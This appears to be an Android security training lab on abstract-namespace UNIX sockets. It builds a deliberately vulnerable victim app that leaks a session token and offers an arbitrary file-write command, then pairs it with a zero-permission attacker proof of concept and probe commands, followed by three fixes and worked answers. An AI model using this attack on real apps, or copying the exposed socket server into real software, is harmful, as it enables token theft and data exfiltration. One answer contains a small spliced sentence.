# Lab 02 — The Abstract Socket

**Difficulty:** Intermediate
**Time:** 2–3 hours
**Prerequisites:** [Lab 01](lab-01-map-the-ipc-surface.md),
[Chapter 24 §3.9–§3.10](../README.md#39-unix-domain-sockets--the-filesystem-named-kind),
[02-Linux-Basics](../../02-Linux-Basics/README.md), [22-SELinux](../../22-SELinux/README.md)

---

## Objective

Build a vulnerable app that exposes a control channel over `LocalServerSocket`, prove from a
**second, unprivileged application** that any app on the device can drive it, then apply three
different fixes and re-test after each one to see exactly which attack each fix stops.

## Why this matters

An abstract-namespace UNIX socket is the most under-tested surface on Android, and the reason is
structural rather than incidental.

> **Definition**
> **Abstract namespace.** A Linux extension to `AF_UNIX`. If the first byte of `sun_path` in the
> `sockaddr_un` structure is a NUL byte, the kernel treats the remainder not as a filesystem path but
> as an opaque name in a **kernel-global namespace with no filesystem representation whatsoever**.
> By convention these are written with a leading `@`.

Read the consequence slowly, because it is the entire lab:

**An abstract socket has no inode. It has no owner and no group. It has no mode bits — there is not
even a permission to get wrong. `chmod` has nothing to change, and no directory permission protects
it, because it is in no directory.** Any process in the same network namespace, which on Android is
every app on the device, can `connect()` to it if it knows the name.

And the SDK makes it the **default**. `android.net.LocalSocketAddress` has three namespaces —
`ABSTRACT`, `RESERVED`, `FILESYSTEM` — and the single-argument constructor selects `ABSTRACT`. The
shortest thing an Android developer can write for cross-process IPC is also the most exposed thing
they could have written, and nothing in the API, the Javadoc or the IDE says so.

You will not believe how exposed this is from reading about it. You will believe it after your
attacker app, with **zero permissions declared**, prints the victim's session token.

---

## Setup

You need two apps and one device. An emulator is fine; note the Android version, because SELinux
policy is the one thing that varies.

```bash
# host
adb devices
adb shell getprop ro.build.version.sdk
adb shell getenforce
```

### The victim app

Package `com.iplab.victim`. Two source files and a manifest.

**`IpcServerThread.java`** — deliberately vulnerable, shaped like real code:

```java
package com.iplab.victim;

import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.util.Log;
import org.json.JSONObject;
import java.io.*;

/**
 * A JSON-over-socket control channel between our main process and our :worker
 * process. Twenty minutes of work, familiar from server programming, and it
 * compiles first time.
 *
 * It is also reachable by every application on the device.
 */
public class IpcServerThread extends Thread {

    static final String SOCKET_NAME = "com.iplab.victim.ipc";
    private final Session session;
    private final File dbFile;

    IpcServerThread(Session session, File dbFile) {
        this.session = session;
        this.dbFile = dbFile;
    }

    @Override public void run() {
        try {
            // The single-argument constructor selects the ABSTRACT namespace.
            LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
            Log.i("victim", "listening on @" + SOCKET_NAME);
            while (!isInterrupted()) {
                LocalSocket client = server.accept();
                handle(client);
                client.close();
            }
        } catch (Exception e) {
            Log.e("victim", "ipc server died", e);
        }
    }

    private void handle(LocalSocket client) throws Exception {
        BufferedReader r = new BufferedReader(
                new InputStreamReader(client.getInputStream()));
        OutputStream out = client.getOutputStream();
        String line = r.readLine();
        if (line == null) return;

        JSONObject req = new JSONObject(line);
        switch (req.optString("cmd")) {
            case "ping":
                out.write("{\"status\":\"ok\",\"version\":\"2.1\"}\n".getBytes("UTF-8"));
                break;
            case "get_token":
                // Hands the session token to whoever connected.
                out.write(("{\"token\":\"" + session.token() + "\"}\n").getBytes("UTF-8"));
                break;
            case "export_db":
                // Copies the private database anywhere this app can write.
                copy(dbFile, new File(req.getString("dest")));
                out.write("{\"status\":\"exported\"}\n".getBytes("UTF-8"));
                break;
            default:
                out.write("{\"error\":\"unknown cmd\"}\n".getBytes("UTF-8"));
        }
        out.flush();
    }

    private static void copy(File from, File to) throws IOException {
        try (InputStream in = new FileInputStream(from);
             OutputStream os = new FileOutputStream(to)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
        }
    }
}
```

**`Session.java`** and the launcher:

```java
package com.iplab.victim;

public class Session {
    private static final Session INSTANCE = new Session();
    public static Session get() { return INSTANCE; }
    // Stands in for a real auth token.
    public String token() { return "eyJhbGciOiJIUzI1NiJ9.LAB_SESSION_TOKEN.sig"; }
}
```

```java
package com.iplab.victim;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import java.io.*;

public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView tv = new TextView(this);
        tv.setText("victim running — IPC server started");
        setContentView(tv);

        // A private database for the export_db command to steal.
        File db = new File(getFilesDir(), "app.db");
        try (Writer w = new FileWriter(db)) {
            w.write("user=alice\npan=4111111111111111\nnote=private lab data\n");
        } catch (IOException ignored) { }

        new IpcServerThread(Session.get(), db).start();
    }
}
```

```xml
<!-- com.iplab.victim/AndroidManifest.xml — note: NOTHING here mentions a socket -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.iplab.victim">
    <application android:label="Victim">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

Look at that manifest again before you continue. **There is no component, no permission, and no
attribute anywhere in it that hints the socket exists.** Every manifest-driven scanner will report
this app as having one exported activity and nothing else.

### The attacker app

Use [`../examples/attacker-app/`](../examples/attacker-app/README.md), which already has an abstract
socket probe, or write the minimum by hand:

```java
// Attacker app — AndroidManifest declares NO permissions at all
LocalSocket s = new LocalSocket();
s.connect(new LocalSocketAddress("com.iplab.victim.ipc",
                                 LocalSocketAddress.Namespace.ABSTRACT));
s.getOutputStream().write("{\"cmd\":\"get_token\"}\n".getBytes("UTF-8"));
s.getOutputStream().flush();
byte[] buf = new byte[4096];
int n = s.getInputStream().read(buf);
Log.i("poc", "STOLEN: " + new String(buf, 0, n, "UTF-8"));
```

Build and install both:

```bash
# host
adb install -r victim.apk
adb install -r attacker.apk
adb shell am start -n com.iplab.victim/.MainActivity
```

---

## Steps

### Step 1 — Confirm the socket exists, and that nothing guards it

```bash
# adb shell
cat /proc/net/unix | grep '@'
```

```bash
# adb shell as root — attribute it to a process by inode
PID=$(pidof -s com.iplab.victim)
ls -l /proc/$PID/fd | grep socket
```

**Q1.** Find the entry for `@com.iplab.victim.ipc`. Which columns of `/proc/net/unix` tell you the
owner, the group, and the mode? What does that absence mean?

**Q2.** Compare with a *filesystem* socket. What would `ls -lZ` show for one, and which of those
fields exist for the abstract socket?

### Step 2 — Reach it from the shell (which proves less than it looks)

```bash
# host
adb push ../scripts/abstract-socket-probe.py /data/local/tmp/
adb shell "cd /data/local/tmp && python3 abstract-socket-probe.py --list"
adb shell "cd /data/local/tmp && python3 abstract-socket-probe.py \
    --name com.iplab.victim.ipc --probe-all"
```

Or from your workstation, without pushing anything:

```bash
# host
python3 ../scripts/abstract-socket-probe.py --via-adb \
    --name com.iplab.victim.ipc --send '{"cmd":"get_token"}'
```

**Q3.** You now have the token. Is this a finding? Justify your answer in one sentence, and name the
two identities involved.

### Step 3 — Reach it from an ordinary app (which proves everything)

```bash
# host
adb logcat -c
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.victim --es only sockets
adb logcat -s poc:I
```

**Q4.** How many permissions does the attacker app declare? Which of them was needed for this?

**Q5.** Run `export_db` with a destination inside the *victim's* own sandbox, and then somewhere the
victim can write that the attacker can read. What is the severity of an endpoint that copies a
private file to an attacker-chosen path, and what is the prerequisite?

```bash
# host — via the probe script, targeting the victim's own cache first
python3 ../scripts/abstract-socket-probe.py --via-adb --name com.iplab.victim.ipc \
    --send '{"cmd":"export_db","dest":"/data/data/com.iplab.victim/cache/leak.db"}'
```

### Step 4 — See it from inside the victim

```bash
# host
frida -U -f com.iplab.victim -l ../scripts/trace-ipc.js
```

**Q6.** What does `trace-ipc.js` print at the moment `LocalServerSocket` is constructed, and why is
that hook worth more than every static grep in the chapter for this particular bug?

### Step 5 — Fix 1: move to the FILESYSTEM namespace

```java
// FIX 1 — an explicit FILESYSTEM-namespace socket inside the private data dir.
File sockFile = new File(context.getFilesDir(), "ipc.sock");
sockFile.delete();                       // stale socket files block bind()
LocalSocketAddress addr = new LocalSocketAddress(
        sockFile.getAbsolutePath(), LocalSocketAddress.Namespace.FILESYSTEM);
LocalServerSocket server = new LocalServerSocket(addr.getName());
```

Rebuild, reinstall, restart the victim, and re-run **every** attack from steps 2 and 3.

```bash
# adb shell — is it still in the abstract list?
cat /proc/net/unix | grep '@' | grep -i victim
# adb shell as root — what protects it now?
ls -lZ /data/data/com.iplab.victim/files/ipc.sock
ls -ldZ /data/data/com.iplab.victim
```

**Q7.** Which attacks stop working, and *why*? Name the specific access control that now applies.

**Q8.** Does the attacker app get a different exception than before? What is it, and what does the
difference tell a tester who sees it in the field?

### Step 6 — Fix 2: authenticate the peer

Fix 1 relies on the directory mode being right. Add a check that does not:

```java
// FIX 2 — verify the connecting process's credentials, supplied by the KERNEL.
LocalSocket client = server.accept();
android.net.Credentials cred = client.getPeerCredentials();
if (cred.getUid() != android.os.Process.myUid()) {
    Log.w("victim", "rejecting uid " + cred.getUid());
    client.close();
    continue;
}
handle(client);
```

This is the Java face of `getsockopt(fd, SOL_SOCKET, SO_PEERCRED, …)`. The kernel fills the structure
at `connect()` time from the peer's own credentials; the peer cannot influence it.

Now **deliberately revert Fix 1** — go back to the abstract socket — and keep only Fix 2. Re-test.

**Q9.** With an abstract socket plus a `SO_PEERCRED` uid check, can the attacker app still connect?
Can it still get the token? What is the difference between those two questions, and which one decides
severity?

**Q10.** `Credentials` also carries a **pid**. Why must you never authorise on it? (Chapter §3.21.1.)

### Step 7 — Fix 3: delete the socket entirely

The best fix is usually to stop hand-rolling IPC.

```java
// FIX 3 — a non-exported bound service. The PLATFORM enforces the boundary.
public class IpcService extends Service {
    private final IIpc.Stub binder = new IIpc.Stub() {
        @Override public String getToken() {
            if (Binder.getCallingUidOrThrow() != Process.myUid()) {
                throw new SecurityException("not our process");
            }
            return Session.get().token();
        }
        // export_db does not exist at all — the worker reads its own file
    };
    @Override public IBinder onBind(Intent i) { return binder; }
}
```

```xml
<service android:name=".IpcService"
         android:exported="false"
         android:process=":worker" />
```

Re-test everything.

**Q11.** What does the attacker see now? Which layer refused it — your code, or the platform?

**Q12.** Rank the three fixes by (a) how much attacker capability they remove, (b) how much they
depend on the developer getting a second thing right, and (c) how likely they are to survive the next
five years of maintenance by someone who did not write them.

### Step 8 — The SELinux question

```bash
# adb shell — with the abstract socket restored and no peer check
dmesg | grep -i avc | tail -20
# or
logcat -b events | grep -i avc | tail -20
```

**Q13.** Did any SELinux denial appear when the attacker app connected? What would it mean if one
had? Why does that make "test on every Android version in scope" a hard requirement rather than
diligence?

---

## Hints

<details>
<summary>Hint 1 — `LocalServerSocket` throws "Address already in use"</summary>

For the **abstract** namespace, the name is released when the process holding it exits — but a
previous instance of your victim app may still be alive:

```bash
# adb shell
am force-stop com.iplab.victim
```

For the **filesystem** namespace, a stale socket *file* blocks `bind()`. Delete it before binding —
that `sockFile.delete()` line in Fix 1 is not decoration.
</details>

<details>
<summary>Hint 2 — the attacker app cannot connect even before any fix</summary>

Check, in order:

1. Is the victim actually running and past `onCreate`? The socket is created there.
2. Is the name exactly right, with no `@`? The `@` is display convention; the API takes the bare name.
3. Did you pass `Namespace.ABSTRACT` explicitly? The two-argument constructor needs it; only the
   one-argument form defaults.
4. Look for an SELinux denial in `dmesg | grep avc`. On some builds `untrusted_app` to `untrusted_app`
   socket connections are denied, and that is a genuinely interesting result — record it with the
   exact build.
</details>

<details>
<summary>Hint 3 — `nc` on the device will not talk to an abstract socket</summary>

Most Android `nc` builds have no abstract-namespace support, and even `nc -U` expects a path. Use
`../scripts/abstract-socket-probe.py`, or `adb forward tcp:9999 localabstract:<name>` and connect to
`127.0.0.1:9999` from your host. Remember the forward is created by adbd, so it proves existence, not
app reachability.
</details>

<details>
<summary>Hint 4 — `getPeerCredentials()` throws or returns -1</summary>

Call it on the **accepted client socket**, not on the server socket, and call it before you read from
the stream. On some releases the credentials are only populated after the connection is fully
established; if you see `-1`, do a one-byte read first and try again.
</details>

<details>
<summary>Hint 5 — how do I find the name if the app is obfuscated?</summary>

R8 does not rename string literals, so the name is usually still in the DEX:

```bash
# host
grep -rn "LocalServerSocket" out/sources/
strings -a classes.dex | grep -E "_ipc$|\.sock$|^@"
```

If string encryption is in use, catch it at runtime instead — `trace-ipc.js` hooks the constructor
and prints the decrypted name. That is why the dynamic hook beats the grep for this bug.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1–Q2.** `/proc/net/unix` has columns for refcount, protocol, flags, type, state, inode and path.
There is **no owner, no group and no mode column**, because an abstract socket has none of those
things — it is not a file. A filesystem socket would show under `ls -lZ` as `srwxr-xr-x owner group
… context path`, and every one of those fields is a control. For the abstract socket, none of them
exist. That is the finding, stated structurally.

**Q3.** Not yet a finding. You proved the socket exists and speaks, from `adb shell` — UID 2000, in
the SELinux domain `shell`. The two identities involved are `shell` and `untrusted_app`, and SELinux
policy treats them differently. Only the second one supports the sentence "any app the user installs
can do this".

**Q4.** Zero permissions were needed. `INTERNET` is declared in the probe app only for the localhost
probe; the abstract-socket path uses none. There is no permission that governs abstract sockets,
because there is nothing for a permission to attach to.

**Q5.** An endpoint that copies a private file to a caller-chosen path is an **arbitrary file write
with the victim's authority**, and the prerequisite is *nothing at all*. That combination is Critical
in most applications: it is a write primitive inside another app's sandbox, and combined with a
readable destination it becomes arbitrary read as well.the attacker cannot choose a
destination the *victim* cannot write — the write happens with the victim's UID, which is exactly
what makes it a confused deputy in miniature.

**Q6.** It prints the constructor call with the resolved name and states plainly that the namespace
is abstract. It beats every static grep because it survives string encryption and obfuscation: the
name must exist in cleartext at the moment the constructor runs, whatever the DEX looks like on disk.

**Q7–Q8.** After Fix 1 the abstract name disappears from `/proc/net/unix`, and the socket becomes a
file inside `/data/data/com.iplab.victim/files/`. Now DAC applies: the data directory is mode 0700,
so no other app can traverse into it, and SELinux labels the file with the app's own type. The
attacker's `connect()` fails with a **different** error — `ENOENT`/"No such file or directory" for the
old abstract name, or `EACCES`/permission denied for the path. In the field that difference matters:
`ENOENT` means "wrong name, keep guessing", while `EACCES` means "right name, genuinely blocked".

**Q9.** With the abstract socket restored and only Fix 2 in place, the attacker **can still
connect** — there is nothing to prevent that — but it gets closed immediately and cannot get the
token. Those are different questions: connectivity is about the namespace, and capability is about
the check. **Severity is decided by the second one.** An abstract socket that accepts a connection
and then rejects the peer is a hardening item, not a vulnerability.

**Q10.** Because `Credentials.getPid()` names a *process*, and processes exit and PID numbers are
recycled. Anything that reads the PID and then looks something up with it — `/proc/<pid>/cmdline`,
a package mapping — is racing against the caller exiting and the number being reused. The UID is a
property of the app's installation and is copied from kernel-held credentials, so it is stable and
unforgeable. Log the PID; decide on the UID.

**Q11–Q12.** After Fix 3 the attacker gets `bindService` returning false or a `SecurityException`,
and the refusal comes from **`system_server`**, not from your code — the platform evaluated
`exported="false"` before your process was ever involved. Ranking: Fix 3 removes the most capability
and depends on nothing else being right, because the boundary is enforced by the platform; Fix 1
removes a lot but depends on the data directory's mode staying correct, and on nobody "temporarily"
switching back to the one-argument constructor; Fix 2 removes capability but not connectivity, and
depends on the check being present on every accept path forever. Fix 3 is also the one most likely to
survive maintenance, because a future developer would have to deliberately export a service to break
it, whereas Fix 1 and Fix 2 can be undone by a one-line "simplification".

**Q13.** If a denial appeared, SELinux — not your fix — was what stopped the attack, and the result
would not generalise: a different Android version, a different OEM policy or a different `targetSdk`
may permit it. That is why version coverage is a requirement, not diligence. Record the exact build
fingerprint alongside every socket result, positive or negative.

</details>

---

## Success criteria

- [ ] You built and ran a victim app whose manifest gives **no** hint that a socket exists
- [ ] You located `@com.iplab.victim.ipc` in `/proc/net/unix` and attributed it to a PID by inode
- [ ] You can state, without looking it up, which access controls exist for an abstract socket
- [ ] You reached it from `adb shell` and explained why that is not yet a finding
- [ ] You reached it from an app declaring **zero** permissions, and captured the token in logcat
- [ ] You exercised the arbitrary-file-write command and reasoned about whose authority performed it
- [ ] You caught the socket's creation live with `trace-ipc.js`
- [ ] You applied all three fixes, re-tested after each, and recorded which attacks each one stops
- [ ] You can explain the difference between "cannot connect" and "connects but is rejected", and
      which one determines severity
- [ ] You checked for SELinux denials and recorded the build fingerprint your results apply to
- [ ] You can explain in one sentence why `LocalServerSocket("name")` is the SDK's most dangerous
      convenience
